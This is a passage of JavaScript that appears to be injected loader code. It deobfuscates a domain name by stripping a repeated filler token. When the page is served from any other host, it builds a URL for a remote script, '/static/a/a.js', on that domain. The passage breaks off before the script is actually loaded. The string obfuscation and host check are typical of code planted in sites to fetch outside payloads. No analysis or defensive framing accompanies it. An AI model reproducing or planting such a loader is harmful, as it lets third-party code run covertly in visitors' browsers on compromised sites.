...
var str = ("0s0a111daoh0s0a111angt0s0a111x.c0s0a111om").replace("0s0a111", "").replace("0s0a111", "").replace("0s0a111", "").replace("0s0a111", "");
try {
	if (location.host.indexOf(str) == -1) {
		str = "//static." + ("0s0a111daoh0s0a111angt0s0a111x.c0s0a111om").replace("0s0a111", "").replace("0s0a111", "").replace("0s0a111", "").replace("0s0a111", "") + "/static/a/a.js";
